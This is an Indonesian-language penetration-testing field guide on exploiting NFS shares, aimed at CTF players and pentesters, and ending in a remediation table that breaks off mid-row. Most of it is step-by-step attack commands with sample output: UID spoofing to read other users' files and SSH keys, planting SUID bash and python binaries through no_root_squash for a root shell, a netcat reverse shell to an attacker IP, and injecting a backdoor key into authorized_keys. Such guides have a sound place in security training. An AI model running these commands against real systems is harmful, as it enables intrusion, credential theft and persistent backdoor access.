---
id: "13"
title: "13. NFS Exploitation & Network File System Workflow — Master Field Guide"
category: "2. Network Services"
categoryId: "network"
filename: "13_nfs_workflow.md"
refs_out: ["01","03","06","14a","15","44"]
refs_in: ["04","09","12"]
---

# 13. NFS Exploitation & Network File System Workflow — Master Field Guide

```text
==================================================================================
DOCUMENTATION TYPE : Service Exploitation & Privilege Escalation Workflow
SERVICE TARGET     : Network File System (NFS / RPC Portmapper)
DEFAULT PORTS      : TCP/UDP 111 (rpcbind / portmapper), TCP/UDP 2049 (nfsd)
DYNAMIC PORTS      : High ports (mountd, nlockmgr, rquotad via RPC)
TARGET AUDIENCE    : Penetration Testers, CTF Players (HTB / THM / Proving Grounds)
PLATFORM CONTEXT   : Parrot OS XFCE / Debian CLI
PREREQUISITES      : [01. Mindset, Metodologi, dan Workflow Pentesting — Panduan Fundamental](/docs/mindset-dan-metodologi), [03. Nmap Master Workflow & Network Scanning — Panduan Komprehensif](/docs/nmap-master), [06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh)
==================================================================================
```

---

## 🧠 BAGIAN 1: NFS FUNDAMENTALS

### 1.1 Apa itu NFS? (Analogi Flashdisk Jaringan)

**Network File System (NFS)** adalah protokol terdistribusi yang memungkinkan komputer klien me-mount (*mengaitkan*) direktori di server remote dan berinteraksi dengan file-file di dalamnya seolah-olah direktori tersebut berada di hard disk lokal klien itu sendiri.

```text
+=============================================================================+
|                      ANALOGI FLASHDISK JARINGAN KANTOR                      |
+=============================================================================+
|                                                                             |
|  [ SERVER NFS (Gudang Data Linux) ]                                         |
|  Memiliki folder `/var/backups` dan mengekspornya ke jaringan.             |
|                                │                                            |
|                      (Kabel Jaringan TCP 2049)                              |
|                                ▼                                            |
|  [ KLIEN PENTESTER (Parrot OS) ]                                            |
|  Menjalankan perintah `mount`. Seketika folder `/mnt/nfs` di Parrot OS       |
|  berperilaku seperti flashdisk virtual yang dicolokkan langsung ke server! |
|  Semua file bisa dibaca, diedit, atau ditambahkan executable baru.          |
|                                                                             |
+=============================================================================+
```

* **Kenapa NFS Sering Menjadi Titik Krusial di CTF & Pentest?**
  1. **Privilege Escalation Tercepat**: Kesalahan konfigurasi `no_root_squash` memungkinkan pengguna biasa naik ke **root** dalam hitungan detik.
  2. **Model Kepercayaan Lemah (UID Trust Model)**: NFSv2 dan NFSv3 mempercayai nomor User ID (UID) yang dikirimkan oleh klien tanpa otentikasi kriptografis (*UID Spoofing*).
  3. **Kebocoran File Sensitif**: Admin sering mengekspor direktori `/home`, script backup database, file konfigurasi web, atau SSH private key (`id_rsa`) dengan izin akses anonim atau wildcard (`*`).

---

### 1.2 Port yang Terlibat dalam Arsitektur NFS

```text
+----------+-----------+-------------------+-----------------------------------------------+
| Port     | Protokol  | Service Daemon    | Fungsi & Peran dalam Jaringan                 |
+----------+-----------+-------------------+-----------------------------------------------+
| 111      | TCP / UDP | rpcbind /         | **Pintu Masuk Utama**. Memberitahu klien port |
|          |           | portmapper        | berapa yang sedang digunakan oleh service NFS.|
+----------+-----------+-------------------+-----------------------------------------------+
| 2049     | TCP / UDP | nfs / nfsd        | **Daemon Utama NFS**. Menangani transfer data |
|          |           |                   | baca/tulis file antara klien dan server.      |
+----------+-----------+-------------------+-----------------------------------------------+
| Dinamis  | TCP / UDP | mountd (rpc.mountd| Menangani negosiasi otorisasi awal permintaan |
| (Random) |           |                   | mount share sebelum dialihkan ke port 2049.   |
+----------+-----------+-------------------+-----------------------------------------------+
| Dinamis  | TCP / UDP | nlockmgr / statd  | Mengelola file locking agar 2 klien tidak     |
| (Random) |           | (rpc.statd)       | merusak file yang sama secara bersamaan.      |
+----------+-----------+-------------------+-----------------------------------------------+
```

* **Mengapa Muncul Port Dinamis (Random High Ports)?**  
  Pada arsitektur UNIX kuno (RPC), daemon pembantu seperti `mountd` dan `statd` meminta port acak ke kernel saat sistem boot, lalu mendaftarkan port tersebut ke `portmapper` (Port 111). Klien pertama kali akan mengetuk port 111 untuk bertanya: *"Di port berapa `mountd` berjalan hari ini?"*.

---

### 1.3 Versi NFS: NFSv2 vs. NFSv3 vs. NFSv4

```text
+----------+--------------------+-----------------------------+---------------------------------------+
| Versi    | Mekanisme Jaringan | Model Otentikasi            | Implikasi Keamanan Pentest            |
+----------+--------------------+-----------------------------+---------------------------------------+
| NFSv2    | Stateless / UDP    | Berbasis UID integer murni  | Kuno (32-bit), rentan spoofing total. |
+----------+--------------------+-----------------------------+---------------------------------------+
| NFSv3    | Stateless / TCP+UDP| Berbasis UID/GID (AUTH_SYS) | **Paling sering di CTF**. Sangat      |
|          | Membutuhkan Port 11| Tanpa enkripsi & otentikasi | rentan terhadap **UID Spoofing** dan  |
|          |                    | identitas klien.            | **no_root_squash**.                   |
+----------+--------------------+-----------------------------+---------------------------------------+
| NFSv4    | Stateful / TCP     | Mendukung Kerberos          | Menggunakan port tunggal 2049.        |
|          | Port 2049 tunggal  | (RPCSEC_GSS) dan pemetaan   | Lebih aman jika Kerberos aktif,       |
|          | (Tanpa Port 111)   | nama user@domain.           | tetapi tetap rentan jika miskonfigurasi|
+----------+--------------------+-----------------------------+---------------------------------------+
```

---

### 1.4 File Konfigurasi Server: `/etc/exports`

File `/etc/exports` di server Linux mendefinisikan direktori mana saja yang dibagikan dan opsi izin apa yang diberikan kepada klien.

* **Format Sintaks `/etc/exports`**:
```text
/direktori/yang/dishare   klien_yang_diizinkan(opsi_izin_1,opsi_izin_2)
```

* **Contoh Konfigurasi Nyata**:
```text
/var/nfs/public           *(rw,sync,no_subtree_check,no_root_squash)
/home/developer           192.168.1.0/24(rw,sync,no_subtree_check,root_squash)
/opt/backups              10.10.11.0/24(ro,all_squash,anonuid=1001,anongid=1001)
```

* **Kamus Opsi Konfigurasi Penting**:
  * `ro` : Read-Only. Klien hanya bisa membaca file, tidak bisa membuat atau memodifikasi file.
  * `rw` : Read-Write. Klien diizinkan membaca, mengedit, membuat, dan menghapus file.
  * `sync` : Perubahan file disimpan ke disk server secara real-time sebelum server merespons klien.
  * `async` : Mengabaikan sinkronisasi disk real-time demi kecepatan (berisiko korupsi data jika listrik padam).
  * `no_subtree_check` : Menonaktifkan pengecekan sub-direktori (meningkatkan kehandalan transfer file).
  * `root_squash` : **Opsi Default Aman**. Jika user `root` (UID 0) dari klien mengakses share, server akan mendegradasi hak aksesnya menjadi user anonim `nobody` / `nogroup` (UID 65534).
  * `no_root_squash` : **MISKONFIGURASI FATAL (CRITICAL VULN)**. Server mempercayai user `root` dari klien! User `root` di Parrot OS memiliki kekuasaan penuh sebagai `root` di server target.
  * `all_squash` : Memaksa **SEMUA** pengguna klien (apapun UID-nya) menjadi akun anonim (`nobody`).
  * `anonuid` / `anongid` : Menentukan nomor UID/GID spesifik yang akan diberikan kepada akun yang di-squash.

---

### 1.5 Konsep UID/GID & Kelemahan "Trust Model" NFS

Di Linux, hak akses file tidak ditentukan oleh nama string teks (*"budi"* atau *"alice"*), melainkan oleh angka integer yang disebut **User Identifier (UID)** dan **Group Identifier (GID)**.

```text
Username 'alice'  ====> Kernel membaca UID 1001
Username 'budi'   ====> Kernel membaca UID 1002
Username 'root'   ====> Kernel membaca UID 0
```

Pada protokol NFSv2 dan NFSv3:
1. Ketika Anda meminta file di folder NFS yang ter-mount, kernel sistem operasi Anda mengirimkan paket RPC yang berisi angka: *"Saya adalah UID 1001, tolong buka file ini"*.
2. Server NFS **TIDAK PERNAH** meminta password untuk membuktikan apakah Anda benar-benar `alice`!
3. Server hanya melihat: *"Oh, paket ini membawa UID 1001, dan file ini memang milik UID 1001. Akses diizinkan!"*.

---

### 1.6 Analogi `root_squash` vs. `no_root_squash`

```text
+=============================================================================+
|                      ANALOGI PASPOR DAN GELAR RAJA                          |
+=============================================================================+
|                                                                             |
|  Bayangkan Anda adalah "Raja" (Root / UID 0) di negara Anda sendiri         |
|  (Komputer Klien / Parrot OS). Sekarang Anda berkunjung ke negara tetangga  |
|  (Server Target).                                                           |
|                                                                             |
|  1. JIKA NEGARA TETANGGA MENERAPKAN "root_squash" (STANDAR AMAN):            |
|     Imigrasi berkata: "Di negaramu kamu boleh jadi Raja, tapi saat masuk ke |
|     wilayah kami, kamu kami perlakukan sebagai turis biasa (user 'nobody')."|
|     --> Anda TIDAK BISA mengubah file sistem atau memasang backdoor root.   |
|                                                                             |
|  2. JIKA NEGARA TETANGGA MENERAPKAN "no_root_squash" (FATAL VULNERABILITY):  |
|     Imigrasi berkata: "Oh, Anda Raja di negara Anda? Silakan! Di negara     |
|     kami Anda juga diakui sebagai Raja tertinggi (Root)!"                   |
|     --> Anda BISA meletakkan file biner SUID yang memberi shell root instan!|
|                                                                             |
+=============================================================================+
```

---

### 1.7 NFS di Lingkungan Windows Server (Services for NFS)

Meskipun NFS identik dengan ekosistem Linux/UNIX, **Windows Server (2012, 2016, 2019, 2022)** juga memiliki fitur opsional bernama **Server for NFS**.

* **Cara Mendeteksi NFS di Server Windows**:
```bash
nmap -p 2049 --script nfs-showmount $TARGET
```

* **Cara Mount Share Windows NFS dari Parrot OS**:
```bash
sudo mkdir -p /mnt/win_nfs
sudo mount -t nfs -o nolock $TARGET:/nfs_share /mnt/win_nfs
```

* **Perbedaan Fundamental Keamanan Pentest**:
  * **Model Izin**: Windows tidak menggunakan UID/GID Unix, melainkan menggunakan **NTFS ACL (Access Control Lists)** dan Security Identifiers (SID).
  * **UID Spoofing**: Teknik UID spoofing tradisional **tidak berlaku** pada Windows NFS murni, kecuali server Windows tersebut dikonfigurasikan dengan integrasi Active Directory UNIX Attributes (RFC 2307).
  * **Fokus Eksploitasi**: Pada Windows NFS, fokus utama pentester adalah mencari file konfigurasi sensitif, backup database, script PowerShell/BAT yang menyimpan plaintext password, atau file VHD/VHDX disk image.

---

## 🛠️ BAGIAN 2: TOOL ARSENAL NFS

```text
=======================================================================================================
TOOL               FUNGSI UTAMA                        KECEPATAN   PROTOKOL YANG DIDUKUNG
=======================================================================================================
showmount          Melihat daftar exported shares      Sangat Cepat NFSv2, NFSv3
rpcinfo            Mengecek registrasi service RPC     Sangat Cepat Port 111 (Portmapper)
mount              Mengaitkan remote share ke lokal    Cepat       NFSv2, NFSv3, NFSv4
nmap (NSE)         Audit otomatis share & statfs       Sedang      Port 111, 2049
useradd / su       Manipulasi identitas UID lokal      Instan      Linux OS Access Control
=======================================================================================================
```

---

### 2.1 Verifikasi & Instalasi Tool Client di Parrot OS

Secara default Parrot OS XFCE sudah menyertakan paket NFS client. Jika utilitas `showmount` atau `mount.nfs` belum tersedia, pasang melalui APT:

```bash
# Verifikasi keberadaan paket nfs-common:
which showmount || sudo apt update && sudo apt install nfs-common -y
```

---

### 2.2 `showmount` — Enumerasi NFS Shares

Perintah utama untuk menanyakan ke daemon `mountd` folder apa saja yang diekspor oleh server:

```bash
# 1. Menampilkan seluruh direktori yang diekspor (Exports List) - PALING SERING DIPAKAI:
showmount -e 10.10.11.200

# 2. Menampilkan semua klien yang sedang me-mount share di server target:
showmount -a 10.10.11.200

# 3. Hanya menampilkan daftar direktori tanpa informasi subnet klien:
showmount -d 10.10.11.200
```

* **Contoh Output Nyata `showmount -e`**:
```text
Export list for 10.10.11.200:
/var/nfs/general (everyone)
/home/developer  10.10.11.0/24
/opt/backups     *
```
* **Keterangan**: Tanda `(everyone)` atau `*` mengindikasikan share tersebut dapat di-mount oleh **SIAPA SAJA** di jaringan tanpa batasan IP!

---

### 2.3 `rpcinfo` — Enumerasi Registrasi Service RPC

Menanyakan langsung ke Port 111 daemon apa saja yang sedang terdaftar dan di port berapa:

```bash
# Menampilkan tabel program RPC, versi, protokol, dan nomor port:
rpcinfo -p 10.10.11.200
```

* **Contoh Output Nyata**:
```text
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100005    1   udp  45231  mountd
    100005    3   tcp  38923  mountd
    100021    4   tcp  41093  nlockmgr
```
* **Cara Membaca Program Number Penting**:
  * `100000` = `portmapper` (Port 111)
  * `100003` = `nfs` (Port 2049)
  * `100005` = `mountd` (Port acak yang bertugas melayani mount)

---

### 2.4 `mount` & `umount` — Mengaitkan dan Melepaskan Share

```bash
# 1. Buat direktori lokal sebagai titik mount (Mount Point):
sudo mkdir -p /mnt/target_nfs

# 2. Mount standar (NFSv3 dengan opsi nolock - direkomendasikan untuk CTF):
sudo mount -t nfs -o nolock 10.10.11.200:/var/nfs/general /mnt/target_nfs

# 3. Mount dengan memaksa versi spesifik (NFSv3):
sudo mount -t nfs -o nfsvers=3,nolock 10.10.11.200:/opt/backups /mnt/target_nfs

# 4. Mount dengan mode Read-Only:
sudo mount -t nfs -o ro,nolock 10.10.11.200:/home/developer /mnt/target_nfs

# 5. Melepaskan mount (Unmount) setelah selesai:
sudo umount /mnt/target_nfs

# 6. Unmount paksa jika folder sedang macet/busy:
sudo umount -l /mnt/target_nfs   # Lazy unmount
sudo umount -f /mnt/target_nfs   # Force unmount
```

---

### 2.5 Nmap NSE Scripts untuk NFS

```bash
# 1. Menampilkan daftar share melalui Nmap (Alternatif showmount):
nmap -p 111,2049 --script nfs-showmount 10.10.11.200

# 2. Menampilkan isi file di dalam share tanpa perlu me-mount secara manual:
nmap -p 111,2049 --script nfs-ls 10.10.11.200

# 3. Menampilkan informasi disk space dan file system stats:
nmap -p 111,2049 --script nfs-statfs 10.10.11.200
```

---

## 🎯 BAGIAN 3: WORKFLOW UTAMA (STEP BY STEP)

```bash
# Setup Variabel Operasional di Terminal Parrot OS:
export TARGET="10.10.11.200"
export MOUNT_DIR="/mnt/nfs_loot"
```

---

### FASE 1: DETEKSI NFS (PORT 111 + 2049)

Tujuan: Mengetahui apakah service RPC Portmapper dan NFS Daemon aktif di mesin target.

```bash
# 1. Scan Nmap Port 111 dan 2049 TCP & UDP
sudo nmap -sS -sU -p 111,2049 -sV $TARGET -oN nmap_nfs.txt

# 2. Query Detail Service RPC via rpcinfo
rpcinfo -p $TARGET
```

* **Hasil yang Diharapkan**:
  * Port 111 TCP/UDP `open` (rpcbind).
  * Port 2049 TCP `open` (nfs versi 3 atau 4).
  * Daemon `mountd` terdaftar di RPC.

---

### FASE 2: ENUMERASI NFS SHARES (EXPORT LIST)

Tujuan: Mengidentifikasi folder apa saja yang dibagikan dan siapa yang diizinkan mengaksesnya.

```bash
showmount -e $TARGET
```

* **Interpretasi Output Target**:
  * Kasus A: `Export list for 10.10.11.200: / *`  
    ➔ **JACKPOT TERTINGGI!** Seluruh hard disk root filesystem (`/`) diekspor untuk semua orang.
  * Kasus B: `/home/peter 10.10.11.0/24`  
    ➔ Folder home milik user `peter`. Jika IP VPN kita berada di range subnet tersebut, kita bisa membacanya dan mencari file `.ssh/id_rsa`.
  * Kasus C: `/var/backups (everyone)`  
    ➔ Folder backup yang sangat berpotensi menyimpan dump database SQL, arsip zip, atau konfigurasi credential.

---

### FASE 3: MOUNTING NFS SHARE KE SISTEM LOKAL

```bash
# 1. Buat direktori lokal sebagai tempat penampungan file
sudo mkdir -p $MOUNT_DIR

# 2. Lakukan mounting dengan opsi 'nolock' (menghindari error locking statd di CTF)
sudo mount -t nfs -o nolock $TARGET:/var/nfs/general $MOUNT_DIR

# 3. Verifikasi apakah filesystem remote berhasil terpasang di sistem kita
df -h | grep nfs
```

* **Contoh Output `df -h`**:
```text
Filesystem                     Size  Used Avail Use% Mounted on
10.10.11.200:/var/nfs/general   20G  8.2G   11G  44% /mnt/nfs_loot
```

---

### FASE 4: ANALISIS ISI SHARE & MEMBACA FILE SENSITIF

```bash
# 1. Navigasi ke dalam mount point
cd $MOUNT_DIR

# 2. Tampilkan semua file tersembunyi beserta UID angka pemiliknya (Gunakan -n!):
ls -lan
```

> [!TIP]
> **KENAPA HARUS `ls -lan` (NUMERIC UID)?**  
> Jika Anda hanya mengetik `ls -la`, sistem Parrot OS akan mencoba mencocokkan UID pemilik file dengan database `/etc/passwd` lokal Anda. Jika di Parrot OS tidak ada nama user tersebut, `ls` hanya akan menampilkan angka (misal `1001`). Opsi `-n` memaksa tampilan UID dan GID murni berupa angka integer.

```text
drwxr-xr-x 2  1000  1000 4096 Sep  3 10:00 .
drwxr-xr-x 3     0     0 4096 Sep  3 09:00 ..
-rw-r--r-- 1  1000  1000  220 Sep  3 10:05 notes.txt
-rw------- 1  1001  1001 2602 Sep  3 10:10 id_rsa
-rw-r----- 1     0  1002  540 Sep  3 10:15 db_config.php
```

* **Analisis Temuan**:
  1. `notes.txt` memiliki izin `r--r--` (Read untuk semua orang), bisa langsung dibaca: `cat notes.txt`.
  2. `id_rsa` memiliki izin `-rw-------` (Hanya pemilik UID `1001` yang boleh membaca). Jika kita membacanya sebagai user biasa (UID 1000), terminal akan menjawab: `Permission denied`.  
     ➔ **Solusi**: Lakukan **UID Spoofing** (Fase 5)!

---

### FASE 5: UID SPOOFING ATTACK (BYPASS PERMISSION DENIED)

Karena NFSv3 mempercayai UID pengirim secara buta tanpa password, kita bisa membuat akun user baru di Parrot OS dengan nomor UID yang persis sama dengan pemilik file di target!

```text
+=============================================================================+
|                        MEKANISME UID SPOOFING ATTACK                        |
+=============================================================================+
|                                                                             |
|  [ SERVER NFS ]                                                             |
|  File: `id_rsa` (Owner: UID 1001, Permissions: 600 - Owner Only)           |
|                                                                             |
|  Klien Normal (Parrot user: UID 1000) ──> Request Baca ──> DENIED!          |
|                                                                             |
|  Klien Spoofed:                                                             |
|  1. Di Parrot OS jalankan: `sudo useradd -u 1001 -m fakeuser`               |
|  2. Berpindah user: `sudo su fakeuser` (Sekarang UID lokal kita = 1001!)   |
|  3. Klien Spoofed (UID 1001) ──> Request Baca ──> DITERIMA (GRANTED)!      |
|                                                                             |
+=============================================================================+
```

* **Langkah Operasional UID Spoofing di Terminal Parrot OS**:

```bash
# 1. Buat akun user dummy di Parrot OS dengan UID 1001:
sudo useradd -u 1001 -m fakeuser

# 2. Pindah ke konteks user dummy tersebut:
sudo su fakeuser

# 3. Verifikasi nomor UID aktif Anda:
id
# Output: uid=1001(fakeuser) gid=1001(fakeuser) groups=1001(fakeuser)

# 4. Baca file yang sebelumnya berstatus "Permission denied":
cat /mnt/nfs_loot/id_rsa > /tmp/stolen_id_rsa

# 5. Kembali ke user normal dan amankan permission key:
exit
chmod 600 /tmp/stolen_id_rsa
```

#### ⚠️ Penanganan Kasus Khusus (Edge Cases) pada UID Spoofing:

##### Kasus A: UID yang Ingin Di-Spoof Sudah Ada di Parrot OS
Jika UID target kebetulan bentrok dengan akun lokal di Parrot OS (misal UID 1001 sudah digunakan akun lain):
```bash
# Cek apakah UID sudah terdaftar:
getent passwd 1001

# Jika sudah ada, jangan pakai useradd standar!
# Buat akun terisolasi dengan home directory di /tmp agar tidak merusak sistem lokal:
sudo useradd -u 1001 -m -d /tmp/fakeuser1001 -s /bin/bash fakeuser1001
sudo su fakeuser1001
```

##### Kasus B: Bypass UID Tanpa Perlu `sudo / root` Menggunakan User Namespaces (`unshare`)
Jika di mesin pengujian Anda tidak memiliki hak sudo lokal, gunakan utilitas kernel Linux `unshare` untuk memetakan UID saat ini ke UID target secara virtual:
```bash
# Memetakan proses shell saat ini agar kernel mengirimkan UID 1001 ke paket NFS:
unshare -U bash --map-user=1001

# Cek UID:
id
# Output: uid=1001(fakeuser) ... (Bekerja instan tanpa hak root lokal!)
```

---

### FASE 6: `no_root_squash` EXPLOITATION (ROOT SHELL INSTAN)

Jika share dikonfigurasi dengan opsi `no_root_squash` dan memiliki izin `rw` (Read-Write), kita dapat menanam binary berekstensi SUID root dari komputer penyerang ke folder share tersebut.

```text
+=============================================================================+
|                     ALUR no_root_squash SUID EXPLOITATION                   |
+=============================================================================+
|                                                                             |
|  [ KOMPUTER PENYERANG (Parrot OS - Kita adalah ROOT Lokal) ]                |
|  1. `sudo cp /bin/bash /mnt/nfs_loot/rootbash`                              |
|  2. `sudo chmod +xs /mnt/nfs_loot/rootbash` (Atur SUID bit!)                |
|                                │                                            |
|                  (Tersinkronisasi via NFS Port 2049)                        |
|                                ▼                                            |
|  [ SERVER TARGET (Linux Target) ]                                           |
|  Karena 'no_root_squash' aktif, file `/var/nfs/general/rootbash` di server |
|  akan berpemilik UID 0 (root) dengan bendera SUID aktif (-rwsr-sr-x)!       |
|                                │                                            |
|                                ▼                                            |
|  [ KITA DI SHELL TARGET (Sebagai Low-Priv User 'www-data' atau 'peter') ]   |
|  Jalankan: `/var/nfs/general/rootbash -p`                                   |
|  Hasil: BASH MEMPERTAHANKAN PRIVILEGE ROOT --> INSTANT ROOT SHELL!          |
|                                                                             |
+=============================================================================+
```

#### Cara Memverifikasi `no_root_squash` Sebelum Eksploitasi:
Sebelum menyalin binary besar, lakukan verifikasi cepat dari sisi Parrot OS setelah share di-mount:
```bash
# 1. Buat file percobaan sebagai root lokal:
sudo touch $MOUNT_DIR/test_root_check

# 2. Periksa numeric owner UID file tersebut:
ls -lan $MOUNT_DIR/test_root_check

# 3. Analisis Hasil:
# ➔ Jika Owner UID = 0 (root)      : no_root_squash AKTIF! (Lampu hijau untuk eksploitasi!)
# ➔ Jika Owner UID = 65534 (nobody) : root_squash AKTIF (Eksploitasi SUID tidak akan berhasil)

# Bersihkan file uji coba:
sudo rm -f $MOUNT_DIR/test_root_check
```

#### Metode Eksploitasi 1: Menyalin Biner Bash (Metode Utama)

```bash
# Step 1: Di Parrot OS (Sebagai ROOT lokal), salin binary bash ke share NFS
sudo cp /bin/bash $MOUNT_DIR/rootbash

# Step 2: Atur izin SUID (SetUID) dan izinkan eksekusi untuk semua user
sudo chmod +xs $MOUNT_DIR/rootbash
# Atau menggunakan notasi oktal:
sudo chmod 4755 $MOUNT_DIR/rootbash

# Step 3: Verifikasi atribut file di mount point
ls -la $MOUNT_DIR/rootbash
# Output WAJIB mengandung huruf 's': -rwsr-xr-x 1 root root 1234567 rootbash
```

* **Step 4: Eksekusi di Sisi Server Target (Shell Korban)**:
```bash
# Di terminal target (misal reverse shell www-data atau SSH user biasa):
cd /var/nfs/general
./rootbash -p

# Periksa identitas root:
whoami
# Output: root
id
# Output: uid=1000(peter) gid=1000(peter) euid=0(root) groups=1000(peter)
```
> [!IMPORTANT]
> **MENGAPA HARUS MEMAKAI FLAG `-p`?**  
> Secara default, GNU Bash modern memiliki proteksi keamanan bawaan: jika mendeteksi dirinya dijalankan sebagai SUID dan Real UID != Effective UID, Bash akan secara otomatis men-drop hak akses kembali ke user biasa. Flag `-p` (*privileged mode*) memerintahkan Bash untuk **TIDAK** membuang privilese root tersebut!

---

#### Metode Eksploitasi 2: Menggunakan Biner Python3 (Alternatif Jika Bash Gagal)
Jika biner bash di Parrot OS mengalami ketidakcocokan library glibc dengan target Linux lama:
```bash
# Di Parrot OS (Root):
sudo cp /usr/bin/python3 $MOUNT_DIR/rootpy
sudo chmod +xs $MOUNT_DIR/rootpy

# Di Terminal Target:
/var/nfs/general/rootpy -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

#### Metode Eksploitasi 3: Menggunakan Biner Netcat (Spawn Reverse Shell Root)
```bash
# Di Parrot OS (Root):
sudo cp /usr/bin/nc.traditional $MOUNT_DIR/rootnc 2>/dev/null || sudo cp /bin/nc $MOUNT_DIR/rootnc
sudo chmod +xs $MOUNT_DIR/rootnc

# Buka Listener di Parrot OS:
nc -lvnp 4444

# Di Terminal Target:
/var/nfs/general/rootnc -e /bin/bash <ATTACKER_IP> 4444
# Seketika koneksi masuk ke listener Parrot OS sebagai root!
```

---

### FASE 7: SSH ATTACKS VIA NFS (KEY LOOTING & INJECTION)

Skenario paling klasik di CTF: direktori `/home/<username>` diekspor melalui NFS.

#### 7.1 Menemukan & Menyalin SSH Private Key (`id_rsa`)
```bash
# 1. Mount folder home target:
sudo mount -t nfs -o nolock $TARGET:/home/developer $MOUNT_DIR

# 2. Cari direktori .ssh:
ls -la $MOUNT_DIR/.ssh/

# 3. Salin SSH Private Key ke mesin Parrot OS:
cp $MOUNT_DIR/.ssh/id_rsa /tmp/developer_id_rsa
chmod 600 /tmp/developer_id_rsa

# 4. Login SSH ke server target tanpa password:
ssh -i /tmp/developer_id_rsa developer@$TARGET
```

#### 7.2 Injeksi SSH Public Key ke `authorized_keys` (Jika Memiliki Izin Tulis `rw`)
Jika folder home target memiliki izin tulis (`rw`) atau diekspor dengan `no_root_squash`, kita bisa membuat kunci SSH baru dan menanamkan public key kita langsung ke file `authorized_keys` target:

```bash
# Step 1: Generate SSH Key Pair baru di Parrot OS (tanpa passphrase):
ssh-keygen -t rsa -b 4096 -f /tmp/nfs_backdoor_key -N ""

# Step 2: Buat folder .ssh di dalam mount share jika belum ada:
sudo mkdir -p $MOUNT_DIR/.ssh
sudo chmod 700 $MOUNT_DIR/.ssh

# Step 3: Tanamkan public key kita ke file authorized_keys:
cat /tmp/nfs_backdoor_key.pub | sudo tee -a $MOUNT_DIR/.ssh/authorized_keys
sudo chmod 600 $MOUNT_DIR/.ssh/authorized_keys

# Step 4: Login SSH langsung ke mesin target menggunakan private key:
ssh -i /tmp/nfs_backdoor_key developer@$TARGET
```

---

## 🚀 BAGIAN 4: PRIVILEGE ESCALATION VIA NFS

### 4.1 Skenario Lengkap: Low-Priv Shell ➔ `/etc/exports` ➔ Root Shell

Seringkali Anda berhasil mendapatkan shell awal sebagai `www-data` (melalui web exploit) atau user biasa, namun buntu (*stuck*) saat mencari jalur eskalasi privilese.

#### Step 1: Audit File `/etc/exports` di Shell Target
```bash
# Di shell target, periksa konfigurasi ekspor NFS:
cat /etc/exports
```
* **Hasil Output Target**:
```text
/opt/dev_share *(rw,no_root_squash,async)
```
* **Analisis Kerentanan**:
  * Direktori `/opt/dev_share` mengaktifkan `no_root_squash`.
  * Wildcard `*` mengizinkan komputer penyerang me-mount share tersebut.

#### Step 2: Mount Share dari Parrot OS Penyerang
```bash
# Di Parrot OS:
sudo mkdir -p /mnt/privesc
sudo mount -t nfs -o nolock $TARGET:/opt/dev_share /mnt/privesc
```

#### Step 3: Salin Binary Bash Lokal & Pasang Bit SUID
Metode paling stabil dan portabel di Linux adalah menyalin binary bash dari klien yang kompatibel:

```bash
# Di Parrot OS (sebagai root lokal):
sudo cp /bin/bash /mnt/privesc/rootbash
sudo chmod +xs /mnt/privesc/rootbash
ls -la /mnt/privesc/rootbash
# Output: -rwsr-sr-x 1 root root ... rootbash
```

#### Step 4: Picu Shell Root di Sisi Target
```bash
# Kembali ke shell target (www-data / lowpriv user):
/opt/dev_share/rootbash -p

# Verifikasi akses:
id
# Output: uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
cat /root/root.txt
```

---

## 🔗 BAGIAN 5: NFS ATTACK CHAINING

```text
+=============================================================================+
|                        NFS ATTACK CHAINING TAXONOMY                         |
+=============================================================================+
```

### 🔗 Chain 1: Port 2049 Terbuka ➔ Mount `/home` ➔ Curi `id_rsa` ➔ Initial SSH Foothold

```text
[ Port 2049 Open ] ──> showmount -e ──> /home/albert * (Everyone)
                             │
                             ▼
[ Mount ke /mnt/nfs ] ──> Baca /mnt/nfs/.ssh/id_rsa
                             │
                             ▼
[ Parrot OS CLI ] ──> chmod 600 id_rsa ──> ssh -i id_rsa albert@$TARGET
                             │
                             ▼
                 [ USER SHELL OBTAINED! ]
```

---

### 🔗 Chain 2: Low-Priv Shell ➔ `/etc/exports` (`no_root_squash`) ➔ SUID Bash ➔ Root Shell

```text
[ Low-Priv Shell ] ──> cat /etc/exports ──> /var/nfs *(rw,no_root_squash)
                             │
                             ▼
[ Parrot OS Host ] ──> sudo cp /bin/bash /mnt/nfs/rootbash && sudo chmod +xs rootbash
                             │
                             ▼
[ Target Terminal ] ──> /var/nfs/rootbash -p
                             │
                             ▼
                 [ ROOT SYSTEM COMPROMISE! ]
```

---

### 🔗 Chain 3: Web Application Backup ➔ NFS Anonymous Export ➔ Database Password ➔ SSH Root

```text
[ showmount -e ] ──> /backup/web (everyone)
                             │
                             ▼
[ Mount Share ] ──> Ekstrak file: /backup/web/site_backup.tar.gz
                             │
                             ▼
[ Tar Unpack ] ──> Baca wp-config.php ──> DB_USER='root', DB_PASS='M4st3rP@ss2024'
                             │
                             ▼
[ Password Reuse ] ──> ssh root@$TARGET (Gunakan DB_PASS)
                             │
                             ▼
                 [ DIRECT ROOT ACCESS! ]
```

---

### 🔗 Chain 4: UID Spoofing ➔ Bypass Izin Ketat ➔ Ekstraksi File Konfigurasi Rahasia

```text
[ ls -lan /mnt/nfs ] ──> secret_token.json (-rw------- 1 1337 1337)
                             │
                             ▼
[ Permission Denied ] ──> Klien ditolak karena UID lokal kita != 1337
                             │
                             ▼
[ Useradd Dummy ] ──> sudo useradd -u 1337 dummy && sudo su dummy
                             │
                             ▼
[ Read File Granted ] ──> cat secret_token.json ──> AWS / API Access Token!
```

---

## 🛡️ BAGIAN 6: COMMON NFS MISCONFIGURATIONS & REMEDIATION

```text
+-----------------------+-----------------------------------+-------------------------------------+---------------------------------------------+
| Konfigurasi Rentan    | Risiko Keamanan                   | Vektor Eksploitasi                  | Rekomendasi Mitigasi / Perbaikan           |
+-----------------------+-----------------------------------+-------------------------------------+---------------------------------------------+
| `no_root_squash`      | **CRITICAL**. Klien root diakui   | Penyerang membuat file SUID binary  | Hapus opsi ini. Selalu gunakan opsi default |
|                       | sebagai root sistem target.       | dari klien dan memicu root shell.   | `root_squash` di `/etc/exports`.            |
+-----------------------+-----------------------------------+-------------------------------------+---------------------------------------------+
| Wildcard Host (`*`)   | Siapa saja di jaringan bisa       | Penyerang langsung me-mount share   | Tentukan subnet spesifik, contoh:           |
|                       | me-mount share tanpa otentikasi.  | tanpa perlu validasi identitas IP.  | `192.168.1.50(rw)` bukan `*(rw)`.           |
